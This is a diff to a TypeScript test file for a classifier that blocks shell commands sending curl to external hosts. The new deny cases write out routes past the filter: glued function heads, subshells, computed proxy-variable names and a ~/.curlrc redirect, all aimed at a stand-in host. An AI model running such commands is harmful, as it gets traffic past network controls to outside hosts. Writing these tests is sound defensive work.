@@ -3,6 +3,7 @@
 // 1. curl's own URL globbing ({a,b}, [n-m]) in the host part: the host is a set, not read.
 // 2. -K / --config: url / proxy lines the argv never shows.
 // 3. shell expansion the assignment reading does not take ($1, $@, arrays, +=, read, set -A, ...).
+// Round 3 (didi 36034): every glued head form, a computed variable name, `unset` stays allowed.
 // Round 2 (didi 36014): slashes after the scheme, a glued f()( body, a proxy variable.
 // Found on the way (dexter): a function body (`f(){ curl ...; }; f`) and a subshell's closing `)`
 // glued to the URL (`(curl -s http://evil.example.com)`) both passed the running gate.
@@ -78,6 +79,17 @@ const mustDeny: Array<[string, string]> = [
   ['export HTTPS_PROXY', `export HTTPS_PROXY=http://${EV}:8080; curl -s https://localhost:3420/`],
   ['env ALL_PROXY', `env ALL_PROXY=socks5://${EV} curl -s http://localhost:3420/`],
   ['a quoted proxy name', `export "https_pro"xy=http://${EV}; curl -s https://localhost:3420/`],
+  // round 3 (didi 36034): every glued function head, and a computed variable name
+  ['f()( curl, space after the opener', `f()( curl -s https://${EV}/x); f`],
+  ['f()(command curl', `f()(command curl -s https://${EV}/x); f`],
+  ['function f()(curl', `function f()(curl -s https://${EV}/x); f`],
+  ['nested glued heads', `f()(g()(curl -s https://${EV}/x); g); f`],
+  ['f ()(curl', `f ()(curl -s https://${EV}/x); f`],
+  ['(command curl', `(command curl -s https://${EV}/x)`],
+  ['export ${v}proxy=', `v=http_; export \${v}proxy=http://${EV}:1; curl -s http://localhost:3420/`],
+  ['env ${v}proxy= curl', `v=http_; env \${v}proxy=http://${EV}:1 curl -s http://localhost:3420/`],
+  ['declare -x "${p}="', `declare -x "\${p}=http://${EV}"; curl -s http://localhost:3420/`],
+  ['printf -v a computed name', `printf -v "\${v}proxy" %s http://${EV}; export \${v}proxy; curl -s http://localhost:3420/`],
   // the array a lifted rest inherits is read in full, an external word in it still denies
   ['an array URL after an unclosed backtick', `U=(https://${EV}/x); python3 -c "print('\`')"\ncurl -s "\${U[@]}"`],
   ['an array written in the lifted rest too', `H=(-H a); python3 -c "print('\`')"\nH+=(https://${EV}/x); curl "\${H[@]}" http://localhost:3420/`],
@@ -103,6 +115,10 @@ const mustPass: Array<[string, string]> = [
   ['subshell, quoted local URL', '(curl -s "http://localhost:3420/api")'],
   ['a file URL', 'curl -s file:///tmp/x.json'],
   ['no_proxy only narrows', 'NO_PROXY=localhost curl -s http://localhost:3420/api'],
+  ['unset of the proxy variables', 'unset http_proxy https_proxy; curl -s http://localhost:3420/api'],
+  ['env -u a proxy variable', 'env -u http_proxy curl -s http://localhost:3420/api'],
+  ['an export with a plain name and a computed value', 'export PATH="$HOME/bin:$PATH"; curl -s http://localhost:3420/api'],
+  ['f () { ... } local', 'f () { curl -s http://localhost:3420/api; }; f'],
   // fleet replay (ford): an unclosed backtick lifts the rest of the line; the array written before it holds
   ['the header array before an unclosed backtick', 'H=(-H "A: b"); curl -s "${H[@]}" http://localhost:3420/x | python3 -c "print(\'`\' in \'x\')"\ncurl -s "${H[@]}" http://localhost:3420/y'],
 ]
@@ -123,6 +139,7 @@ describe('card d6b95892: curl destinations the parser cannot read are denied', (
     ['an unknown array', 'curl -s "${Z[@]}" http://localhost:3420/', '<unreadable host: ${Z[@]}>'],
     ['a curlrc', `printf 'url = "https://${EV}/x"\\n' > ~/.curlrc; curl -s http://localhost:3420/`, '<curlrc>'],
     ['a proxy variable', `http_proxy=http://${EV}:8080 curl -s http://localhost:3420/`, '<proxy variable>'],
+    ['a computed variable name', `v=http_; env \${v}proxy=http://${EV}:1 curl -s http://localhost:3420/`, '<computed variable name>'],
   ])('names %s', (_name, cmd, host) => {
     expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'curl-external', hosts: [host] })
   })
